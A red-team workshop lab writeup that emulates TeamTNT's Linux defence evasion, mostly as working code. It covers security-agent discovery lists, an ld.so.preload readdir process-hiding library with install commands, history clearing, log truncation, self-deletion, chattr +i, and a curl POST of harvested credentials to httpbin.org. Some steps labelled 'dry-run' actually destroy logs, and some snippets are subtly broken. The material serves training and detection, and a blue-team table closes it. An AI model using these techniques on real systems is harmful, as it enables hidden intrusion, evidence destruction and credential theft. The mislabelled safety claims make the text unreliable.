# Workshop 2 Lab Writeup — Defense Evasion for Red Team

**44CON 2026** · 50 minutes · Red team operators  
**Threat actor:** [MITRE ATT&CK G0139 — TeamTNT](https://attack.mitre.org/groups/G0139/) / [Hildegard S0601](https://attack.mitre.org/software/S0601/)  
**Platform:** Linux hosts and containers (post-compromise)

---
## 1. TeamTNT Kill Chain (Workshop 2 Scope)

Workshop 2 covers **post-compromise defence evasion** — what TeamTNT does after landing a miner to stay hidden and hinder remediation. It assumes a foothold from Workshop 1 (or a pre-seeded mock miner).

```
┌──────────────┐    ┌─────────────────┐    ┌──────────────────┐
│ 1. Host      │───►│ 2. Discover &   │───►│ 3. Masquerade &  │
│    recon     │    │  disable agents │    │  obfuscate miner │
│ (T1082)      │    │ (T1518,T1685)   │    │ (T1036,T1027)    │
└──────────────┘    └─────────────────┘    └────────┬─────────┘
                                                     │
┌──────────────┐                         ┌─────────▼────────┐
│ 6. Tamper    │◄────────────────────────│ 4. Hide process  │
│  protection  │                         │  (ld.so.preload) │
│ (T1222)      │                         │ (T1574,T1014)    │
└──────▲───────┘                         └────────┬─────────┘
       │                                           │
       └────────────────────────────┌──────────────▼─────────┐
                                    │ 5. Anti-forensics +    │
                                    │    exfil (T1070)       │
                                    └────────────────────────┘
```

**In scope:** userspace hiding, log/history tampering, tamper protection.  
**Out of scope (see Lord of the Ring(0) talk / `diagrams/`):** kernel rootkits (Diamorphine), ftrace hooking — referenced for context only.

**Misconfigurations targeted:**

| Stage           | Weakness                                     |
| --------------- | -------------------------------------------- |
| Agent discovery | Security processes visible, no tamper alerts |
| Hiding          | Writable `/etc/ld.so.preload`, no FIM        |
| Forensics       | Local-only logging, no centralized SIEM      |
| Tamper          | No immutable-attribute monitoring            |

---

## 2. Setting Up the Lab

Workshop 2 uses the **same Docker lab** as Workshop 1. The attacker container mounts Workshop 2 materials at `/opt/teamtnt/evasion/`.

### Prerequisites

- Workshop 1 lab running (recommended: run WS1 chain first for staged creds)
- Docker Engine + Docker Compose v2

### Start the lab

From repository root:

```bash
./setup-lab.sh
```

### Enter the attacker container

```bash
docker compose -f workshop-01-automating-attack-ttps/lab/docker-compose.yml exec attacker bash
```

Pre-set environment variables for Workshop 2:

```bash
TEAMTNT_EVASION_LAB=1
EVASION_STAGING=/tmp/teamtnt-evasion
MOCK_MINER_PATH=/tmp/.dockerd
MOCK_MINER_NAME=k8s-guardian
PRELOAD_SOURCE=/opt/teamtnt/evasion/lib/libprocesshider-demo.c
STAGING_DIR=/tmp/teamtnt-staging    # WS1 harvest (for exfil step)
```

### Build C++ automation (first time)

```bash
bash /opt/teamtnt/evasion/native_automation/build-in-lab.sh
# Binary: /opt/teamtnt/evasion/native_automation/build-docker/evasion_native
```

### Recommended flow

1. Run Workshop 1 (shell or C++) to deploy mock miner and harvest creds
2. Run Workshop 2 evasion chain on the same attacker container
3. Switch to blue-team exercises listed at the end of each step

### Teardown

```bash
cd workshop-01-automating-attack-ttps/lab && docker compose down -v
```

---

## 3. Simulating the TeamTNT Kill Chain

### Run all steps

**Shell automation:**

```bash
/opt/teamtnt/evasion/scripts/evasion-chain.sh
```

**C++ automation:**

```bash
/opt/teamtnt/evasion/native_automation/build-docker/evasion_native
# Single step: evasion_native 4
```

Artifacts are written to `/tmp/teamtnt-evasion/`.

### Attendee C++ exercises

The native automation binary ships **incomplete**: look for `// TODO:` (and the stub `readdir()` body) in the source. Shell scripts (`/opt/teamtnt/evasion/scripts/`) are fully working — use them to verify expected behaviour, then implement the matching C++ / C logic yourself. The snippets in each step below are your reference; **full solutions are shared only at the end of the workshop**.

Rebuild after each edit:

```bash
bash /opt/teamtnt/evasion/native_automation/build-in-lab.sh
/opt/teamtnt/evasion/native_automation/build-docker/evasion_native <step>
```

| Step | `evasion_native` | File (in container) | Function | Approx. lines | What to implement |
|------|------------------|---------------------|----------|---------------|-------------------|
| 1 | `1` | `evasion/native_automation/src/evasion_steps.cpp` | `step01_host_recon()` | ~43–45 | `gethostname()` and `uname()` output into `host-recon.txt` |
| 2 | `2` | `evasion/native_automation/src/evasion_steps.cpp` | `step02_discover_agents()` | ~58–60 | Scan `/proc/*/cmdline` and `systemctl list-units` with `matches_agent_pattern()` |
| 2 | `2` | `evasion/native_automation/src/util.cpp` | `matches_agent_pattern()` | ~128 | Return `true` when text contains known agent substrings |
| 3 | `3` | — | — | — | **Complete** — masquerade, base64 encode/decode, miner launch |
| 4 | `4` | `evasion/lib/libprocesshider-demo.c` | `readdir()` | ~18 | `dlsym(RTLD_NEXT, "readdir")` hook — filter `/proc/<pid>/comm` (see walkthrough below) |
| 4 | `4` | `evasion/native_automation/src/evasion_steps.cpp` | `step04_ld_preload_hide()` | — | **Complete** — gcc build + `LD_PRELOAD` / `/etc/ld.so.preload` install |
| 5 | `5` | `evasion/native_automation/src/evasion_steps.cpp` | `step05_anti_forensics()` | ~117–119 | Clear `~/.bash_history` and check/truncate writable log paths |
| 6 | `6` | — | — | — | **Complete** — `chattr +i` on mock miner (`step06_chattr_immutable()`) |

Repo-relative paths (on your host): `workshop-02-defense-evasion-red-team/native_automation/src/…` and `workshop-02-defense-evasion-red-team/lib/libprocesshider-demo.c`

---

### Step 1 — Host Reconnaissance

#### T1082 — System Information Discovery

Collecting OS, architecture, and hostname to tailor payloads and evasion.

**Shell / Linux utilities:**

```bash
hostname
uname -a
cat /etc/os-release
```

**C++** (`evasion_native 1`):

**Your task:** `evasion/native_automation/src/evasion_steps.cpp` → `step01_host_recon()` (~lines 43–45). IP/mount enumeration below is pre-filled.

Collect hostname and kernel identity with POSIX calls:

```cpp
char hostname[256]{};  
gethostname(hostname, sizeof(hostname));  
out << "=== hostname ===\n" << hostname << '\n';

std::ostringstream out;
utsname uts{};  
uname(&uts);  
out << "=== uname ===\n" << uts.sysname << ' ' << uts.nodename << ' ' << uts.release << ' '  
    << uts.version << ' ' << uts.machine << '\n';
```

---

#### T1016 — System Network Configuration Discovery

Enumerating IP addresses and network interfaces for C2 selection and lateral planning.

**Shell / Linux utilities:**

```bash
ip -4 addr show
ip route
cat /etc/resolv.conf
```

**C++:**

Enumerate network interfaces and mount points to plan C2 routing and escape paths:

```cpp
out << "=== ip ===\n" << run_capture("ip -4 addr show 2>/dev/null || ifconfig 2>/dev/null") << '\n';
out << "=== mounts ===\n" << read_file("/proc/mounts").substr(0, 4000) << '\n';
```

---

### Step 2 — Discover Security Agents

#### T1518.001 — Software Discovery: Security Software Discovery

Scanning for cloud security agents (Alibaba `aegis`, Tencent, BMC, EDR) that would detect miners.

**Shell / Linux utilities:**

```bash
ps aux | grep -iE 'aliyun|aegis|falco|crowdstrike|elastic-agent'
ls /opt/  /usr/local/bin/
```

**C++** (`evasion_native 2`):

**Your task:** `evasion/native_automation/src/evasion_steps.cpp` → `step02_discover_agents()` (~lines 58–60) and `evasion/native_automation/src/util.cpp` → `matches_agent_pattern()` (~line 128).

Walk `/proc/*/cmdline` and match against known cloud security agent process names:

```cpp
std::ostringstream out;  
for (const auto& line : read_proc_cmdlines()) {  
  if (matches_agent_pattern(line)) out << line << '\n';  
}
```

And then we match it with known names:
```cpp
bool matches_agent_pattern(const std::string& text) {  
  static const char* patterns[] = {"aliyun", "aegis",     "qcloud", "tencent", "bmc-agent",  
                                   "falco",  "sentinel",  "crowd",  "elastic-agent"};  
  for (const char* p : patterns) {  
    if (text.find(p) != std::string::npos) return true;  
  }  
  return false;  
}
```

---

#### T1007 — System Service Discovery

Enumerating systemd services to find security tooling before disabling it.

**Shell / Linux utilities:**

```bash
systemctl list-units --type=service --all | grep -iE 'aliyun|bmc-agent|falco'
systemctl status aliyun.service 2>/dev/null
```

**C++:**

Also enumerate systemd services and filter with the same agent pattern matcher:

```cpp
const auto services = run_capture("systemctl list-units --type=service --all 2>/dev/null");  
std::istringstream ss(services);  
std::string line;  
while (std::getline(ss, line)) {  
  if (matches_agent_pattern(line)) out << line << '\n';  
}
```

---

#### T1685 — Disable or Modify Tools

Stopping or uninstalling vendor security agents. **Lab: dry-run only** — scripts print intent without modifying real agents.

**Shell / Linux utilities:**

```bash
# TeamTNT would run (DO NOT run in production):
# systemctl stop aliyun.service && systemctl disable aliyun.service
# /usr/local/aegis/uninstall.sh

# Lab dry-run:
for svc in aliyun.service aegis.service bmc-agent.service; do
  systemctl is-active "$svc" 2>/dev/null && echo "would disable: $svc"
done
```

**C++:**

Instead of actually stopping agents, write a dry-run script that logs what TeamTNT would disable:

```cpp
write_file(staging("disable-agents.sh"),
    "#!/bin/bash\nfor svc in aliyun.service aegis.service bmc-agent.service; do\n"
    "  systemctl is-active \"$svc\" 2>/dev/null && echo \"would disable: $svc\"\n"
    "done\n");
chmod(staging("disable-agents.sh").c_str(), 0755);
```

---

### Step 3 — Masquerade & Obfuscate Miner

#### T1036.005 — Masquerading: Match Legitimate Resource Name or Location

Disguising the miner as a legitimate Docker-related process (TeamTNT replaces `.dockerd`, `.dockerenv`).

**Shell / Linux utilities:**

```bash
cat > /tmp/.dockerd <<'EOF'
#!/bin/sh
while true; do dd if=/dev/zero of=/dev/null bs=1M count=1 2>/dev/null; sleep 2; done
EOF
chmod +x /tmp/.dockerd
nohup /tmp/.dockerd >/dev/null 2>&1 &
```

**C++** (`evasion_native 3`):

Drop a CPU-burn loop disguised as a Docker daemon binary, then launch it in the background:

```cpp
const std::string miner_script =
    "#!/bin/sh\nwhile true; do dd if=/dev/zero of=/dev/null bs=1M count=1 2>/dev/null; sleep 2; done\n";
write_file(cfg_.mock_miner_path, miner_script);  // /tmp/.dockerd
chmod(cfg_.mock_miner_path.c_str(), 0755);

const std::string pid = run_capture("nohup " + cfg_.mock_miner_path + " >/dev/null 2>&1 & echo $!");
write_file(staging("miner.pid"), pid);
```

---

#### T1027.013 — Obfuscated Files or Information: Encrypted/Encoded File

Encoding payloads in Base64 to evade simple file-based detection.

**Shell / Linux utilities:**

```bash
base64 < /tmp/.dockerd | tr -d '\n' > /tmp/teamtnt-evasion/payload.b64
```

**C++:**

Encode the miner script in Base64 to evade simple file-based detection:

```cpp
const std::string encoded = base64_encode(miner_script);
write_file(staging("payload.b64"), encoded);
```

---

#### T1140 — Deobfuscate/Decode Files or Information

Decoding and executing obfuscated payloads at runtime.

**Shell / Linux utilities:**

```bash
base64 -d /tmp/teamtnt-evasion/payload.b64 > /tmp/teamtnt-evasion/decoded-miner.sh
chmod +x /tmp/teamtnt-evasion/decoded-miner.sh
```

**C++:**

Decode at runtime to demonstrate the full obfuscate → deploy cycle:

```cpp
write_file(staging("decoded-miner.sh"), base64_decode(encoded));
chmod(staging("decoded-miner.sh").c_str(), 0755);
```

---

### Step 4 — Process Hiding via ld.so.preload

#### T1574.006 — Hijack Execution Flow: Dynamic Linker Hijacking

TeamTNT and Hildegard modify `/etc/ld.so.preload` to intercept `readdir()` and hide miner processes from `ps`/`top`.

Tools like `ps` and `top` list processes by opening `/proc` and calling `readdir()` on each numeric PID directory. The demo library exports a replacement `readdir()` that:

1. Resolves the real libc `readdir` via `dlsym(RTLD_NEXT, "readdir")`
2. Loops over `/proc` entries from the original function
3. Reads `/proc/<pid>/comm` for each candidate
4. Skips entries whose `comm` contains `HIDE_PROCESS_NAME` (default `k8s-guardian`)
5. Returns only non-matching entries to the caller

Preload injection (`LD_PRELOAD` or `/etc/ld.so.preload`) causes the dynamic linker to bind `readdir` to this hook before libc.

| Load method                                        | Scope                           | Lab usage          |
| -------------------------------------------------- | ------------------------------- | ------------------ |
| `LD_PRELOAD=.../libprocesshider.so command`        | Single process tree             | Dry-run (non-root) |
| `echo .../libprocesshider.so > /etc/ld.so.preload` | All dynamically linked programs | Live demo (root)   |

**Your task:** `evasion/lib/libprocesshider-demo.c` → `readdir()` (~line 18). The checked-in stub returns `NULL`; implement the hook body shown in **Full source** below before `gcc` will hide processes. `step04_ld_preload_hide()` in `evasion_steps.cpp` (compile + install) is pre-filled.

**Full source**

```c
/*
 * Educational ld.so.preload demo — hides processes whose comm contains HIDE_PROCESS_NAME.
 * TeamTNT / Hildegard use similar userspace hooks; production malware may also use kernel rootkits.
 * TRAINING ONLY — do not deploy outside isolated lab VMs.
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <dirent.h>

static const char *hide_name(void) {
    const char *n = getenv("HIDE_PROCESS_NAME");
    return n ? n : "k8s-guardian";
}

struct dirent *readdir(DIR *dirp) {
    struct dirent *(*orig)(DIR *) = dlsym(RTLD_NEXT, "readdir");
    struct dirent *ent;
    while ((ent = orig(dirp)) != NULL) {
        if (ent->d_name[0] == '.' ) continue;
        char path[256];
        snprintf(path, sizeof(path), "/proc/%s/comm", ent->d_name);
        FILE *f = fopen(path, "r");
        if (!f) return ent;
        char comm[64] = {0};
        if (fgets(comm, sizeof(comm), f)) {
            comm[strcspn(comm, "\n")] = 0;
            if (strstr(comm, hide_name()) != NULL) {
                fclose(f);
                continue;
            }
        }
        fclose(f);
        return ent;
    }
    return NULL;
}
```

**Line-by-line notes**

| Lines | Symbol | Role |
|-------|--------|------|
| 6 | `_GNU_SOURCE` | Enables GNU `dlsym` / `RTLD_NEXT` declarations |
| 7–11 | includes | `dlfcn.h` for symbol resolution; `dirent.h` for `readdir` |
| 13–16 | `hide_name()` | Reads `HIDE_PROCESS_NAME`; falls back to `k8s-guardian` |
| 18–19 | `readdir()` hook | Same name/signature as libc — intercepted when preloaded |
| 19 | `dlsym(RTLD_NEXT, ...)` | Calls the *next* `readdir` in the link chain (real libc) |
| 21–37 | filter loop | Hide matching PIDs by `continue`; return first visible entry |
| 22 | `d_name[0] == '.'` | Skip `.` / `..` when enumerating directories |
| 24 | `/proc/%s/comm` | Kernel command name (what `ps` often consults) |
| 26 | `if (!f) return ent` | Process may have exited between `readdir` and `fopen` |
| 30 | `strstr(comm, hide_name())` | Substring match — any `comm` containing the hide string is filtered |

**Control flow**

```
ps opens /proc
    │
    ▼
readdir()  ──►  libprocesshider.so (hook)
                    │
                    ▼
               orig() = libc readdir
                    │
                    ▼
          for each /proc/<pid>:
               read comm → match HIDE_PROCESS_NAME?
                 yes → continue (hidden)
                 no  → return entry to ps
```


**Shell / Linux utilities:**

```bash
gcc -shared -fPIC -o /tmp/teamtnt-evasion/libprocesshider.so \
  /opt/teamtnt/evasion/lib/libprocesshider-demo.c -ldl

# Live (requires root):
echo /tmp/teamtnt-evasion/libprocesshider.so > /etc/ld.so.preload

# Dry-run:
LD_PRELOAD=/tmp/teamtnt-evasion/libprocesshider.so HIDE_PROCESS_NAME=k8s-guardian ps aux
```

**C++** (`evasion_native 4`):

Compile the userspace `readdir()` hook library from source:

```cpp
const auto so_path = staging("libprocesshider.so");
const std::string compile_cmd = "gcc -shared -fPIC -o " + so_path.string() + " " +
                                cfg_.preload_source + " -ldl 2>&1";
run_capture(compile_cmd);  // PRELOAD_SOURCE → lib/libprocesshider-demo.c
```

If running as root, install the preload globally; otherwise dry-run with `LD_PRELOAD`:

```cpp
if (is_root()) {
  write_file("/etc/ld.so.preload", so_path.string() + "\n");
  setenv("HIDE_PROCESS_NAME", cfg_.mock_miner_name.c_str(), 1);  // k8s-guardian
} else {
  run_command("HIDE_PROCESS_NAME=" + cfg_.mock_miner_name +
              " LD_PRELOAD=" + so_path.string() + " ps aux | head -5");
}
```

---

#### T1014 — Rootkit

Refer to main lecture slides.

---

### Step 5 — Anti-Forensics & Exfiltration

#### T1070.003 — Indicator Removal: Clear Command History

Clearing bash history to remove evidence of attacker commands. The lab runs inside disposable containers, so this step clears the real `~/.bash_history` rather than redirecting to staging.

**Shell / Linux utilities:**

```bash
history -c
: > ~/.bash_history
history -w
```

**C++** (`evasion_native 5`):

**Your task:** `evasion/native_automation/src/evasion_steps.cpp` → `step05_anti_forensics()` (~lines 117–119) — history clear (T1070.003) and log writability checks (T1070.006). Self-delete script and exfil POST are pre-filled.

Truncate the container's actual bash history file:

```cpp
const char* home = std::getenv("HOME");  
const auto histfile =  
    home ? std::filesystem::path(home) / ".bash_history" : std::filesystem::path("/root/.bash_history");  
write_file(histfile, "");
log("History cleared: " + histfile.string());
```

---

#### T1070.006 — Indicator Removal: Clear Linux or Mac System Logs

Truncating syslog and auth logs. **Lab: dry-run** — checks writability without truncating.

**Shell / Linux utilities:**

```bash
# TeamTNT would run:
# truncate -s 0 /var/log/syslog
# echo > /var/log/auth.log

# Lab check:
for f in /var/log/syslog /var/log/auth.log; do
  [[ -w "$f" ]] && echo "WRITABLE: $f" && "rm -f $f" || echo "protected: $f"
done
```

**C++:**

Check whether system logs are writable (TeamTNT would truncate them; lab only records status):

```cpp
for (const char* logfile : {"/var/log/syslog", "/var/log/auth.log", "/var/log/messages"}) {  
  if (file_writable(logfile)) {  
    warn(std::string("Writable log found: ") + logfile);  
    write_file(logfile, "");  
  } else {  
    append_file(staging("log-status.txt"), std::string("protected: ") + logfile + "\n");  
  }  
}
```

---

#### T1070.004 — Indicator Removal: File Deletion

Self-deleting scripts and removal of staged credential files after use.

**Shell / Linux utilities:**

```bash
cat > /tmp/teamtnt-evasion/run-once.sh <<'EOF'
#!/bin/bash
echo "payload executed"
rm -f "$0"
EOF
bash /tmp/teamtnt-evasion/run-once.sh
```

**C++:**

Write and execute a self-deleting script, then confirm it removed itself:

```cpp
write_file(staging("run-once.sh"), "#!/bin/bash\necho payload executed\nrm -f \"$0\"\n");
run_command("bash " + staging("run-once.sh").string());
if (!std::filesystem::exists(staging("run-once.sh"))) log("Self-delete confirmed");
```

---

#### T1074.001 — Data Staged: Local Data Staging

Aggregating harvested credentials before exfiltration.

**Shell / Linux utilities:**

```bash
cp /tmp/teamtnt-staging/harvested-creds.txt /tmp/teamtnt-evasion/exfil-package.txt
```

**C++:**

Copy Workshop 1 harvested credentials into the evasion staging area:

```cpp
const auto creds = std::filesystem::path(cfg_.attack_staging) / "harvested-creds.txt";
if (std::filesystem::exists(creds)) {
  write_file(staging("exfil-package.txt"), read_file(creds));
  log("Staged creds for exfil demo");
}
```

---

#### T1048 — Exfiltration Over Alternative Protocol

Sending staged data to C2 over HTTP. Lab simulates with a POST to httpbin.org.

**Shell / Linux utilities:**

```bash
curl -X POST -d @/tmp/teamtnt-evasion/exfil-package.txt https://httpbin.org/post
```

**C++:**

POST the staged credential package over HTTPS (simulated C2 exfil):

```cpp
const auto resp = http_.post("https://httpbin.org/post", read_file(creds),
                             {{"Content-Type", "text/plain"}});
if (resp.ok()) {
  log("Exfil simulation POST succeeded (httpbin.org)");
  write_file(staging("exfil-response.json"), resp.body.substr(0, 500));
}
```

---

### Step 6 — Tamper Protection

#### T1222.002 — File and Directory Permissions Modification: Linux

Applying `chattr +i` (immutable flag) to miner binaries so defenders cannot delete or overwrite them without removing the attribute first.

**Shell / Linux utilities:**

```bash
sudo chattr +i /tmp/.dockerd
lsattr /tmp/.dockerd
# Remediation: sudo chattr -i /tmp/.dockerd
```

**C++** (`evasion_native 6`):

Apply the immutable flag so defenders cannot delete or overwrite the miner without `chattr -i` first:

```cpp
if (is_root() && run_command("command -v chattr >/dev/null") == 0) {
  run_command("chattr +i " + cfg_.mock_miner_path);  // /tmp/.dockerd
  write_file(staging("lsattr.txt"), run_capture("lsattr " + cfg_.mock_miner_path));
} else {
  log("Dry-run: would run chattr +i " + cfg_.mock_miner_path);
}
```

---
## Blue Team Detection & Response Exercises

After running the evasion chain, practice detection:

| Technique | Detection command |
|-----------|-------------------|
| Masqueraded miner | `ls -la /tmp/.dockerd`; compare `ps aux` vs `/proc/*/comm` |
| ld.so.preload | `cat /etc/ld.so.preload`; auditd on writes to preload |
| Immutable miner | `lsattr /tmp/.dockerd` |
| Log gaps | Compare local syslog timestamps vs centralized SIEM |

**Cross-validation tip:** If `ps` hides a process but `/proc/<pid>/comm` still shows it, suspect userspace preload hijacking (T1574.006). If `/proc` itself lies, suspect kernel rootkit (T1014) — see `diagrams/` materials.

---

## Cleanup (after lab)

```bash
# Inside attacker or host (if applied with root):
chattr -i /tmp/.dockerd 2>/dev/null
rm -f /etc/ld.so.preload
pkill -f '/tmp/.dockerd' 2>/dev/null
```

---

## References

- [MITRE G0139 — TeamTNT](https://attack.mitre.org/groups/G0139/)
- [Hildegard S0601](https://attack.mitre.org/software/S0601/) — ld.so.preload, systemd miner
- Workshop 1 writeup: `../workshop-01-automating-attack-ttps/lab_writeup.md`

**Legal notice:** Lab only. Dry-run for destructive actions unless explicitly running as root in the isolated attacker container.